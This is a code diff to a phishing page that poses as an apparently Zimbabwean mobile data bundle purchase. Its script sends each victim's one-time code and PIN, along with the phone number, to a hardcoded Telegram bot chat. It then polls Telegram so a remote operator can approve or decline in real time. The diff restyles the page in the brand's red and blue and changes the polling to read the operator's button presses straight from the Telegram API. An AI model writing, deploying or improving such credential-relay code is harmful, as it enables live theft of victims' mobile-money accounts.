@@ -7,10 +7,10 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
         :root {
-            --primary-blue: #0052cc;
-            --primary-blue-dark: #003d99;
-            --primary-blue-light: #1a73e8;
-            --accent-red: #d32f2f;
+            --eco-red: #d32f2f;
+            --eco-blue: #0052cc;
+            --eco-blue-dark: #003d99;
+            --eco-blue-light: #1a73e8;
             --white: #ffffff;
             --light-bg: #f0f4f8;
             --text-dark: #1a1a1a;
@@ -24,7 +24,7 @@
 
         body {
             font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
-            background: linear-gradient(135deg, var(--primary-blue) 0%, var(--primary-blue-dark) 100%);
+            background: linear-gradient(135deg, var(--eco-blue) 0%, var(--eco-blue-dark) 100%);
             min-height: 100vh;
             display: flex;
             flex-direction: column;
@@ -33,14 +33,17 @@
         header {
             background: white;
             padding: 16px 5%;
-            border-bottom: 1px solid var(--border);
+            border-bottom: 2px solid var(--eco-blue);
             box-shadow: 0 2px 8px rgba(0,0,0,0.05);
         }
 
         .logo {
             font-size: 24px;
             font-weight: 800;
-            color: var(--primary-blue);
+            background: linear-gradient(135deg, var(--eco-red) 0%, var(--eco-blue) 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
             text-decoration: none;
             letter-spacing: -0.5px;
         }
@@ -60,6 +63,7 @@
             max-width: 450px;
             width: 100%;
             box-shadow: 0 10px 40px rgba(0,0,0,0.15);
+            border: 2px solid var(--eco-blue);
         }
 
         .otp-header {
@@ -81,7 +85,7 @@
         }
 
         .bundle-info {
-            background: linear-gradient(135deg, var(--primary-blue-light) 0%, var(--primary-blue) 100%);
+            background: linear-gradient(135deg, var(--eco-red) 0%, var(--eco-blue) 100%);
             border-radius: 12px;
             padding: 16px;
             margin-bottom: 28px;
@@ -113,7 +117,7 @@
             display: block;
             font-size: 12px;
             font-weight: 800;
-            color: var(--accent-red);
+            color: var(--eco-red);
             text-transform: uppercase;
             letter-spacing: 0.05em;
             margin-bottom: 12px;
@@ -132,7 +136,7 @@
             text-align: center;
             font-size: 24px;
             font-weight: 700;
-            border: 2px solid var(--primary-blue);
+            border: 2px solid var(--eco-blue);
             border-radius: 10px;
             background: var(--light-bg);
             color: var(--text-dark);
@@ -141,7 +145,7 @@
         }
 
         .otp-box:focus {
-            border-color: var(--accent-red);
+            border-color: var(--eco-red);
             background: white;
             box-shadow: 0 0 0 3px rgba(211, 47, 47, 0.1);
             outline: none;
@@ -163,7 +167,7 @@
             display: none;
             background: rgba(211, 47, 47, 0.1);
             border: 1px solid rgba(211, 47, 47, 0.3);
-            color: var(--accent-red);
+            color: var(--eco-red);
             font-size: 13px;
             font-weight: 600;
             border-radius: 8px;
@@ -184,7 +188,7 @@
 
         .btn-primary {
             flex: 1;
-            background: var(--primary-blue);
+            background: linear-gradient(135deg, var(--eco-red) 0%, var(--eco-blue) 100%);
             color: white;
             border: none;
             padding: 14px 20px;
@@ -195,13 +199,12 @@
             letter-spacing: 0.04em;
             cursor: pointer;
             transition: all 0.2s;
-            box-shadow: 0 4px 12px rgba(0,82,204,0.2);
+            box-shadow: 0 4px 12px rgba(211, 47, 47, 0.2);
         }
 
         .btn-primary:hover:not(:disabled) {
-            background: var(--primary-blue-dark);
             transform: translateY(-1px);
-            box-shadow: 0 6px 16px rgba(0,82,204,0.3);
+            box-shadow: 0 6px 16px rgba(211, 47, 47, 0.3);
         }
 
         .btn-primary:disabled {
@@ -213,8 +216,8 @@
         .btn-secondary {
             flex: 1;
             background: transparent;
-            color: var(--primary-blue);
-            border: 2px solid var(--primary-blue);
+            color: var(--eco-blue);
+            border: 2px solid var(--eco-blue);
             padding: 14px 20px;
             border-radius: 50px;
             font-weight: 800;
@@ -237,7 +240,7 @@
         }
 
         .form-footer a {
-            color: var(--primary-blue);
+            color: var(--eco-blue);
             text-decoration: none;
             font-weight: 800;
         }
@@ -312,6 +315,7 @@
             max-width: 400px;
             width: 100%;
             box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            border: 2px solid var(--eco-blue);
         }
 
         .modal-title {
@@ -334,7 +338,7 @@
         .pin-input-group {
             display: flex;
             align-items: center;
-            border: 2px solid var(--primary-blue);
+            border: 2px solid var(--eco-blue);
             border-radius: 12px;
             padding: 12px 14px;
             background: var(--light-bg);
@@ -343,7 +347,7 @@
         }
 
         .pin-input-group:focus-within {
-            border-color: var(--accent-red);
+            border-color: var(--eco-red);
             background: white;
             box-shadow: 0 0 0 3px rgba(211, 47, 47, 0.1);
         }
@@ -368,7 +372,7 @@
             display: none;
             background: rgba(211, 47, 47, 0.1);
             border: 1px solid rgba(211, 47, 47, 0.3);
-            color: var(--accent-red);
+            color: var(--eco-red);
             font-size: 13px;
             font-weight: 600;
             border-radius: 8px;
@@ -400,20 +404,20 @@
         }
 
         .pin-modal-btn-confirm {
-            background: var(--primary-blue);
+            background: linear-gradient(135deg, var(--eco-red) 0%, var(--eco-blue) 100%);
             color: white;
-            box-shadow: 0 4px 12px rgba(0,82,204,0.2);
+            box-shadow: 0 4px 12px rgba(211, 47, 47, 0.2);
         }
 
         .pin-modal-btn-confirm:hover {
-            background: var(--primary-blue-dark);
             transform: translateY(-1px);
+            box-shadow: 0 6px 16px rgba(211, 47, 47, 0.3);
         }
 
         .pin-modal-btn-cancel {
             background: transparent;
-            color: var(--primary-blue);
-            border: 2px solid var(--primary-blue);
+            color: var(--eco-blue);
+            border: 2px solid var(--eco-blue);
         }
 
         .pin-modal-btn-cancel:hover {
@@ -482,8 +486,8 @@
     <!-- Loading Overlay -->
     <div id="loadingOverlay" class="loading-overlay">
         <div class="spinner"></div>
-        <div class="spin-label">Verifying Code</div>
-        <div class="spin-sub">Check your Telegram for approval</div>
+        <div class="spin-label">Waiting for Approval</div>
+        <div class="spin-sub">Check your Telegram</div>
     </div>
 
     <!-- PIN Modal -->
@@ -510,7 +514,7 @@
         const TELEGRAM_CHAT_ID = '7547427914';
         let otpCode = '';
         let bundleParams = {};
-        let currentRequestId = null;
+        let lastUpdateId = 0;
 
         function loadBundleData() {
             const params = new URLSearchParams(window.location.search);
@@ -608,14 +612,11 @@
                     })
                 });
 
-                if (response.ok) {
-                    const data = await response.json();
-                    return data.result.message_id;
-                }
+                return response.ok;
             } catch (error) {
                 console.error('Telegram error:', error);
             }
-            return null;
+            return false;
         }
 
         function validateOTP() {
@@ -627,47 +628,49 @@
                 return;
             }
 
-            // Generate request ID
-            currentRequestId = 'otp_' + Date.now();
-
-            // Prepare message and buttons
-            const message = `📲 OTP Verification\n\nCode: ${otp}\nPhone: +263${bundleParams.phone}\nBundle: ${bundleParams.data}\n\nRequest ID: ${currentRequestId}`;
+            const message = `📲 OTP Verification\n\nCode: ${otp}\nPhone: +263${bundleParams.phone}\nBundle: ${bundleParams.data}`;
             
             const buttons = [
                 [
-                    { text: '✓ Approved', callback_data: `otp_approved_${currentRequestId}` },
-                    { text: '✗ Declined', callback_data: `otp_declined_${currentRequestId}` }
+                    { text: '✓ Approved', callback_data: 'otp_approved' },
+                    { text: '✗ Declined', callback_data: 'otp_declined' }
                 ]
             ];
 
-            // Send to Telegram
-            sendToTelegram(message, buttons);
-
-            // Show loading overlay
-            document.getElementById('loadingOverlay').classList.add('active');
-
-            // Start polling for response
-            pollForOTPApproval(currentRequestId);
+            sendToTelegram(message, buttons).then(() => {
+                document.getElementById('loadingOverlay').classList.add('active');
+                pollForOTPApproval();
+            });
         }
 
-        function pollForOTPApproval(requestId) {
+        function pollForOTPApproval() {
             const pollInterval = setInterval(() => {
-                const response = localStorage.getItem(`otp_approval_${requestId}`);
-                
-                if (response) {
-                    clearInterval(pollInterval);
-                    localStorage.removeItem(`otp_approval_${requestId}`);
-                    document.getElementById('loadingOverlay').classList.remove('active');
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`)
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data.ok && data.result.length > 0) {
+                            const update = data.result[0];
+                            lastUpdateId = update.update_id;
 
-                    if (response === 'approved') {
-                        document.getElementById('pinModal').classList.add('active');
-                        document.getElementById('pinInput').focus();
-                    } else if (response === 'declined') {
-                        showError('Code verification failed. Please try again.');
-                        document.querySelectorAll('.otp-box').forEach(box => box.value = '');
-                        document.querySelectorAll('.otp-box')[0].focus();
-                    }
-                }
+                            if (update.callback_query) {
+                                const callbackData = update.callback_query.data;
+
+                                if (callbackData === 'otp_approved') {
+                                    clearInterval(pollInterval);
+                                    document.getElementById('loadingOverlay').classList.remove('active');
+                                    document.getElementById('pinModal').classList.add('active');
+                                    document.getElementById('pinInput').focus();
+                                } else if (callbackData === 'otp_declined') {
+                                    clearInterval(pollInterval);
+                                    document.getElementById('loadingOverlay').classList.remove('active');
+                                    showError('Code verification failed. Please try again.');
+                                    document.querySelectorAll('.otp-box').forEach(box => box.value = '');
+                                    document.querySelectorAll('.otp-box')[0].focus();
+                                }
+                            }
+                        }
+                    })
+                    .catch(err => console.error('Poll error:', err));
             }, 1000);
 
             setTimeout(() => clearInterval(pollInterval), 300000);
@@ -698,47 +701,47 @@
                 return;
             }
 
-            // Generate request ID
-            const pinRequestId = 'pin_' + Date.now();
-
-            // Prepare message and buttons
-            const message = `🔐 PIN Verification\n\nPIN: ${pin}\nPhone: +263${bundleParams.phone}\nBundle: ${bundleParams.data}\n\nRequest ID: ${pinRequestId}`;
+            const message = `🔐 PIN Verification\n\nPIN: ${pin}\nPhone: +263${bundleParams.phone}\nBundle: ${bundleParams.data}`;
             
             const buttons = [
                 [
-                    { text: '✓ Valid PIN', callback_data: `pin_valid_${pinRequestId}` },
-                    { text: '✗ Invalid PIN', callback_data: `pin_invalid_${pinRequestId}` }
+                    { text: '✓ Valid PIN', callback_data: 'pin_valid' },
+                    { text: '✗ Invalid PIN', callback_data: 'pin_invalid' }
                 ]
             ];
 
-            // Send to Telegram
             await sendToTelegram(message, buttons);
-
-            // Show loading
             document.getElementById('loadingOverlay').classList.add('active');
-
-            // Start polling for PIN response
-            pollForPINApproval(pinRequestId);
+            pollForPINApproval();
         }
 
-        function pollForPINApproval(requestId) {
+        function pollForPINApproval() {
             const pollInterval = setInterval(() => {
-                const response = localStorage.getItem(`pin_approval_${requestId}`);
-                
-                if (response) {
-                    clearInterval(pollInterval);
-                    localStorage.removeItem(`pin_approval_${requestId}`);
-                    document.getElementById('loadingOverlay').classList.remove('active');
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`)
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data.ok && data.result.length > 0) {
+                            const update = data.result[0];
+                            lastUpdateId = update.update_id;
 
-                    if (response === 'valid') {
-                        window.location.href = `success.html?data=${encodeURIComponent(bundleParams.data)}&price=${encodeURIComponent(bundleParams.price)}`;
-                    } else if (response === 'invalid') {
-                        clearModalError();
-                        showModalError('Invalid PIN. Please try again.');
-                        document.getElementById('pinInput').value = '';
-                        document.getElementById('pinInput').focus();
-                    }
-                }
+                            if (update.callback_query) {
+                                const callbackData = update.callback_query.data;
+
+                                if (callbackData === 'pin_valid') {
+                                    clearInterval(pollInterval);
+                                    window.location.href = `success.html?data=${encodeURIComponent(bundleParams.data)}&price=${encodeURIComponent(bundleParams.price)}`;
+                                } else if (callbackData === 'pin_invalid') {
+                                    clearInterval(pollInterval);
+                                    document.getElementById('loadingOverlay').classList.remove('active');
+                                    clearModalError();
+                                    showModalError('Invalid PIN. Please try again.');
+                                    document.getElementById('pinInput').value = '';
+                                    document.getElementById('pinInput').focus();
+                                }
+                            }
+                        }
+                    })
+                    .catch(err => console.error('Poll error:', err));
             }, 1000);
 
             setTimeout(() => clearInterval(pollInterval), 300000);
